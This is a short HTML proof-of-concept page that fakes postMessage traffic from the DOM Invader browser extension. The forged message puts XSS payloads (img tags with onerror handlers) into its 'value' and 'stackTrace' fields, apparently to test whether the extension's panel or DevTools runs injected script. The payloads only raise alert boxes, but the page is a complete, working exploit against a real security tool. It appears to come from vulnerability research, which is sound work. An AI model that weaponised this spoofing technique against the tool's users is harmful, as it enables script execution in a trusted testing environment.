<!DOCTYPE html>
<html>
<head>
    <title>DOM Invader PoC - Extension Context Only</title>
</head>
<body>
    <h1>Click and check DOM Invader tab</h1>
    <button onclick="trigger()">SEND POSTMESSAGE ONLY</button>
    <script>
        function trigger() {
            const canary = "uitdeeq";
            const payload = "<img src=x onerror=\"alert('Executed in DOM Invader context')\">" + canary;

            // NO innerHTML - only postMessage to the extension
            window.postMessage({
                "source": "dom-invader",
                "type": "augmented-dom",
                "data": {
                    "sink": "innerHTML",
                    "value": payload,
                    "stackTrace": "<img src=x onerror=\"alert('StackTrace XSS in DevTools')\">"
                }
            }, "*");
        }
    </script>
</body>
</html>
